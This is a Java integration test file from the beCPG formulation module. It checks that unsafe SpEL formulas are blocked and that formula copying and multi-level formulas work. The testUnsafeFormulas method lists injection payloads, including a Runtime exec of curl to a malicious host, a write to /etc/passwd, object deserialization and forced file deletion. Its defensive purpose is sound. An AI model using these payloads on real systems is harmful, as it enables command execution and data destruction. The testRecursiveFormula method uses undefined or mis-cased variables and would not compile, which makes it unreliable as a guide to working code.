/*******************************************************************************
 * Copyright (C) 2010-2021 beCPG.
 *
 * This file is part of beCPG
 *
 * beCPG is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Lesser General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * beCPG is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License along with beCPG. If not, see <http://www.gnu.org/licenses/>.
 ******************************************************************************/
package fr.becpg.test.repo.product.formulation;

import java.io.Serializable;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Locale;

import org.alfresco.repo.security.authentication.AuthenticationUtil;
import org.alfresco.service.cmr.repository.NodeRef;
import org.alfresco.service.namespace.QName;
import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;
import org.json.JSONArray;
import org.json.JSONObject;
import org.junit.Test;
import org.springframework.beans.factory.annotation.Autowired;

import fr.becpg.model.BeCPGModel;
import fr.becpg.model.PLMModel;
import fr.becpg.repo.formulation.FormulatedEntity;
import fr.becpg.repo.formulation.FormulationService;
import fr.becpg.repo.helper.AssociationService;
import fr.becpg.repo.helper.MLTextHelper;
import fr.becpg.repo.product.data.ClientData;
import fr.becpg.repo.product.data.FinishedProductData;
import fr.becpg.repo.product.data.SemiFinishedProductData;
import fr.becpg.repo.product.data.constraints.DeclarationType;
import fr.becpg.repo.product.data.constraints.ProductUnit;
import fr.becpg.repo.product.data.productList.CompoListDataItem;
import fr.becpg.repo.product.data.productList.CostListDataItem;
import fr.becpg.repo.product.data.productList.DynamicCharactListItem;
import fr.becpg.repo.product.data.productList.NutListDataItem;
import fr.becpg.repo.repository.AlfrescoRepository;
import fr.becpg.repo.repository.L2CacheSupport;
import fr.becpg.repo.repository.RepositoryEntity;
import fr.becpg.test.repo.product.AbstractFinishedProductTest;

/**
 *
 * @author matthieu
 *
 */
public class FormulaFormulationIT extends AbstractFinishedProductTest {

	protected static final Log logger = LogFactory.getLog(FormulaFormulationIT.class);

	@Autowired
	private AssociationService associationService;

	@Autowired
	private AlfrescoRepository<RepositoryEntity> alfrescoRepository;
	
	@Autowired
	private FormulationService<FormulatedEntity> formulationService;

	@Override
	public void setUp() throws Exception {
		super.setUp();
		// create RM and lSF
		initParts();
	}
	
	@Test
	public void testUnsafeFormulas() {

		List<String> unsafeFormulas = List.of("T(java.lang.Runtime).getRuntime().exec('curl http://malicious-site.com')",
				"T(java.nio.file.Files).write(java.nio.file.Paths.get('/etc/passwd'), 'malicious content'.getBytes())",
				"T(java.lang.Class).forName('java.lang.Runtime').getDeclaredMethod('getRuntime').setAccessible(true).invoke(null)",
				"T(java.io.ObjectInputStream).newInstance(new java.io.FileInputStream('/tmp/malicious_object.ser')).readObject()",
				"''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('echo TEST')",
				"T(sun.misc.Unsafe).getUnsafe().allocateMemory(1024 * 1024 * 10)",
				"T(org.apache.commons.io.FileUtils).forceDelete(new java.io.File('/path/to/sensitive/file'))");

		for (String unsafeFormula : unsafeFormulas) {
			NodeRef finishedProductDataNodeRef = inWriteTx(() -> {
				FinishedProductData finishedProductData = new FinishedProductData();
				finishedProductData.setName("test FP " + unsafeFormula.hashCode());
				List<DynamicCharactListItem> dynamicCharactListItems = new ArrayList<>();
				dynamicCharactListItems.add(new DynamicCharactListItem("formula", unsafeFormula));
				finishedProductData.getCompoListView().setDynamicCharactList(dynamicCharactListItems);
				alfrescoRepository.create(getTestFolderNodeRef(), finishedProductData);
				return finishedProductData.getNodeRef();
			});

			inWriteTx(() -> {
				L2CacheSupport.doInCacheContext(
						() -> AuthenticationUtil
								.runAsSystem(() -> formulationService.formulate(finishedProductDataNodeRef, FormulationService.DEFAULT_CHAIN_ID)),
						false, true);
				return true;
			});

			inReadTx(() -> {
				FinishedProductData finishedProductData = (FinishedProductData) alfrescoRepository.findOne(finishedProductDataNodeRef);
				DynamicCharactListItem dynamicCharactListItem = finishedProductData.getCompoListView().getDynamicCharactList().get(0);
				assertTrue(dynamicCharactListItem.getErrorLog().toString().contains("Type is not authorized")
						|| dynamicCharactListItem.getErrorLog().toString().contains("Expression is unsafe"));
				return null;
			});
		}

	}

	@Test
	public void testAuthorizedTypes() {
		
		NodeRef finishedProductDataNodeRef = inWriteTx(() -> {

			FinishedProductData finishedProductData = new FinishedProductData();
			finishedProductData.setName("testAuthorizedTypes FP");

			List<DynamicCharactListItem> dynamicCharactListItems = new ArrayList<>();
			dynamicCharactListItems.add(new DynamicCharactListItem("formula", "T(fr.becpg.repo.product.data.RawMaterialData).toString();"));

			finishedProductData.getCompoListView().setDynamicCharactList(dynamicCharactListItems);

			alfrescoRepository.create(getTestFolderNodeRef(), finishedProductData);
			return finishedProductData.getNodeRef();
		});
		
		inWriteTx(() -> {
			 L2CacheSupport.doInCacheContext(() -> AuthenticationUtil.runAsSystem(() -> {
				return formulationService.formulate(finishedProductDataNodeRef, FormulationService.DEFAULT_CHAIN_ID);
			}), false, true);
			 return true;
		});
		
		inReadTx(() -> {
			FinishedProductData finishedProductData = (FinishedProductData) alfrescoRepository.findOne(finishedProductDataNodeRef);
			DynamicCharactListItem dynamicCharactListItem = finishedProductData.getCompoListView().getDynamicCharactList().get(0);
			assertEquals("class fr.becpg.repo.product.data.RawMaterialData", dynamicCharactListItem.getValue().toString());
			return null;
		});
		
		inWriteTx(() -> {
			FinishedProductData finishedProductData = (FinishedProductData) alfrescoRepository.findOne(finishedProductDataNodeRef);
			List<DynamicCharactListItem> dynamicCharactList = finishedProductData.getCompoListView().getDynamicCharactList();
			dynamicCharactList.clear();
			dynamicCharactList.add(new DynamicCharactListItem("formula", "T(java.lang.System).toString();"));
			return alfrescoRepository.save(finishedProductData);
		});
		
		inWriteTx(() -> {
			L2CacheSupport.doInCacheContext(
					() -> AuthenticationUtil
							.runAsSystem(() -> formulationService.formulate(finishedProductDataNodeRef, FormulationService.DEFAULT_CHAIN_ID)),
					false, true);
			return true;
		});
		
		inReadTx(() -> {
			FinishedProductData finishedProductData = (FinishedProductData) alfrescoRepository.findOne(finishedProductDataNodeRef);
			DynamicCharactListItem dynamicCharactListItem = finishedProductData.getCompoListView().getDynamicCharactList().get(0);
			assertTrue(dynamicCharactListItem.getErrorLog().toString().contains("Type is not authorized"));
			return null;
		});
	}

	@Test
	public void testCopyHelperFormula() throws Exception {

		NodeRef finishedProductData1NodeRef = inWriteTx(() -> {

			ClientData client1 = new ClientData();
			client1.setName("Client 1");
			alfrescoRepository.create(getTestFolderNodeRef(), client1);

			FinishedProductData finishedProductData1 = new FinishedProductData();
			finishedProductData1.setName("Test Spel Formula 1");
			finishedProductData1.setLegalName("Test Spel Formula 1");

			List<CompoListDataItem> compoList = new ArrayList<>();
			compoList.add(new CompoListDataItem(null, null, null, 1d, ProductUnit.kg, 0d, DeclarationType.Detail, localSF1NodeRef));
			compoList.add(new CompoListDataItem(null, compoList.get(0), null, 1d, ProductUnit.kg, 0d, DeclarationType.Declare, rawMaterial1NodeRef));
			finishedProductData1.getCompoListView().setCompoList(compoList);

			List<CostListDataItem> costList = new ArrayList<>();
			costList.add(new CostListDataItem(null, null, null, null, cost1, null));
			finishedProductData1.setCostList(costList);

			List<NutListDataItem> nutList = new ArrayList<>();
			nutList.add(new NutListDataItem(null, null, null, null, null, null, nut1, null));
			finishedProductData1.setNutList(nutList);

			alfrescoRepository.create(getTestFolderNodeRef(), finishedProductData1);

			nodeService.createAssociation(finishedProductData1.getNodeRef(), supplier1, PLMModel.ASSOC_SUPPLIERS);
			nodeService.createAssociation(finishedProductData1.getNodeRef(), supplier2, PLMModel.ASSOC_SUPPLIERS);
			nodeService.createAssociation(finishedProductData1.getNodeRef(), client1.getNodeRef(), PLMModel.ASSOC_CLIENTS);

			return finishedProductData1.getNodeRef();

		});

		NodeRef finishedProductData2NodeRef = inWriteTx(() -> {

			FinishedProductData finishedProductData2 = new FinishedProductData();
			finishedProductData2.setName("Test Spel Formula 2");

			List<DynamicCharactListItem> dynamicCharactListItems = new ArrayList<>();
			// Product
			dynamicCharactListItems.add(new DynamicCharactListItem("Sync method", "@beCPG.copy(@beCPG.findOne(\"" + finishedProductData1NodeRef
					+ "\"),{\"bcpg:suppliers\",\"bcpg:legalName\",\"bcpg:clients\" },{\"bcpg:costList\",\"bcpg:compoList\"})"));

			finishedProductData2.getCompoListView().setDynamicCharactList(dynamicCharactListItems);

			alfrescoRepository.create(getTestFolderNodeRef(), finishedProductData2);
			return finishedProductData2.getNodeRef();

		});
		

		NodeRef finishedProductData3NodeRef = inWriteTx(() -> {

			FinishedProductData finishedProductData2 = new FinishedProductData();
			finishedProductData2.setName("Test Spel Formula 3");

			List<DynamicCharactListItem> dynamicCharactListItems = new ArrayList<>();
			// Product
			dynamicCharactListItems.add(new DynamicCharactListItem("Sync method", "@beCPG.copy(@beCPG.findOne(\"" + finishedProductData1NodeRef
					+ "\"),{\"bcpg:suppliers\",\"bcpg:legalName\",\"bcpg:clients\" },{\"bcpg:costList\",\"bcpg:compoList|true\"})"));

			finishedProductData2.getCompoListView().setDynamicCharactList(dynamicCharactListItems);

			alfrescoRepository.create(getTestFolderNodeRef(), finishedProductData2);
			return finishedProductData2.getNodeRef();

		});


		inWriteTx(() -> {

			FinishedProductData finishedProductData2 = (FinishedProductData) alfrescoRepository.findOne(finishedProductData2NodeRef);
			FinishedProductData finishedProductData1 = (FinishedProductData) alfrescoRepository.findOne(finishedProductData1NodeRef);
			FinishedProductData finishedProductData3 = (FinishedProductData) alfrescoRepository.findOne(finishedProductData3NodeRef);
			

			assertEquals(2, finishedProductData1.getSuppliers().size());
			assertEquals("Client 1", finishedProductData1.getClients().get(0).getName());

			productService.formulate(finishedProductData2);
			
			productService.formulate(finishedProductData3);

			logger.debug(finishedProductData2.toString());

			assertEquals("Test Spel Formula 1", MLTextHelper.getClosestValue(finishedProductData2.getLegalName(), Locale.FRENCH));
			assertEquals(1, finishedProductData2.getCostList().size());
			assertEquals(2, finishedProductData2.getCompoList().size());
			assertEquals(1, finishedProductData2.getCompoListView().getDynamicCharactList().size());
			
			assertEquals(2, finishedProductData3.getCompoList().size());
			assertEquals(1, finishedProductData3.getCompoListView().getDynamicCharactList().size());
			
			assertEquals("Client 1", finishedProductData2.getClients().get(0).getName());
			assertEquals(2, finishedProductData2.getSuppliers().size());
			assertEquals(1, associationService.getTargetAssocs(finishedProductData2.getNodeRef(), PLMModel.ASSOC_CLIENTS).size());

			return finishedProductData2.getNodeRef();

		});

	}
	
	@Test
	public void testRecursiveFormula() {
		NodeRef finishedProductDataNodeRef = inWriteTx(() -> {

			SemiFinishedProductData SF2 = new SemiFinishedProductData();
			SF2.setName("SF2");
			NodeRef sf2NodeRef = alfrescoRepository.create(getTestFolderNodeRef(), SF2).getNodeRef();
			
			SemiFinishedProductData SF1 = new SemiFinishedProductData();
			SF1.setName("SF1");
			SF1.getCompoListView().setCompoList(Arrays.asList(new CompoListDataItem(null, null, null, 1d, ProductUnit.kg, 0d, DeclarationType.Detail, sf2NodeRef)));
			NodeRef sf1NodeRef = alfrescoRepository.create(getTestFolderNodeRef(), SF1).getNodeRef();
			
			SF2.getCompoListView().setCompoList(Arrays.asList(new CompoListDataItem(null, null, null, 1d, ProductUnit.kg, 0d, DeclarationType.Detail, sf1NodeRef)));
			alfrescoRepository.save(SF2);
			
			SemiFinishedProductData SF3 = new SemiFinishedProductData();
			SF3.setName("SF3");
			NodeRef sf3NodeRef = alfrescoRepository.create(getTestFolderNodeRef(), SF3).getNodeRef();
			
			SemiFinishedProductData SF4 = new SemiFinishedProductData();
			SF4.setName("SF4");
			NodeRef sf4NodeRef = alfrescoRepository.create(getTestFolderNodeRef(), SF4).getNodeRef();
			
			SemiFinishedProductData SF5 = new SemiFinishedProductData();
			SF5.setName("SF5");
			NodeRef sf5NodeRef = alfrescoRepository.create(getTestFolderNodeRef(), SF5).getNodeRef();
			
			SF4.getCompoListView().setCompoList(Arrays.asList(new CompoListDataItem(null, null, null, 1d, ProductUnit.kg, 0d, DeclarationType.Detail, sf5NodeRef)));
			alfrescoRepository.save(SF4);
			
			List<CompoListDataItem> compoList = new ArrayList<>();
			compoList.add(new CompoListDataItem(null, null, null, 1d, ProductUnit.kg, 0d, DeclarationType.Detail, sf4NodeRef));
			compoList.add(new CompoListDataItem(null, null, null, 5d, ProductUnit.kg, 0d, DeclarationType.Detail, sf4NodeRef));
			SF3.getCompoListView().setCompoList(compoList);

			sf3.getCompoListView().setCompoList(compoList);
			alfrescoRepository.save(sf3);

			FinishedProductData FP1 = new FinishedProductData();
			FP1.setName("FP1");
			
			DynamicCharactListItem dynListChar = new DynamicCharactListItem("formula", "90");
			dynListChar.setMultiLevelFormula(true);
			
			dynListChar.setColumnName("bcpg_dynamicCharactColumn1");
			
			FP1.getCompoListView().setDynamicCharactList(Arrays.asList(dynListChar));
			
			List<CompoListDataItem> compoListFP = new ArrayList<>();
			compoListFP.add(new CompoListDataItem(null, null, null, 1d, ProductUnit.kg, 0d, DeclarationType.Detail, sf1NodeRef));
			compoListFP.add(new CompoListDataItem(null, null, null, 1d, ProductUnit.kg, 0d, DeclarationType.Detail, sf3NodeRef));
			FP1.getCompoListView().setCompoList(compoListFP);
			
			alfrescoRepository.create(getTestFolderNodeRef(), FP1);

			return fp1.getNodeRef();
		});
		
		inWriteTx(() -> {
			 L2CacheSupport.doInCacheContext(() -> AuthenticationUtil.runAsSystem(() -> {
				return formulationService.formulate(finishedProductDataNodeRef, FormulationService.DEFAULT_CHAIN_ID);
			}), false, true);
			 return true;
		});
			
		inWriteTx(() -> {
			FinishedProductData fp1 = (FinishedProductData) alfrescoRepository.findOne(finishedProductDataNodeRef);

			int checks = 0;
			
			for (CompoListDataItem item : FP1.getCompoList()) {
				
				SemiFinishedProductData SF = (SemiFinishedProductData) alfrescoRepository.findOne(item.getProduct());
				
				Serializable dynCol = nodeService.getProperty(item.getNodeRef(), QName.createQName(BeCPGModel.BECPG_URI, "dynamicCharactColumn1"));
				
				assertNotNull(dynCol);
				
				if ("SF1".equals(SF.getName())) {
					JSONObject json = new JSONObject(dynCol.toString());
					assertEquals(3, ((JSONArray) json.get("sub")).length());
					checks++;
				} else if ("SF3".equals(semiFinishedProduct.getName())) {
					assertEquals(4, ((JSONArray) json.get("sub")).length());
					checks++;
				}
			}

			assertEquals(2, checks);
			
			return FP1.getNodeRef();
		});
	}

}
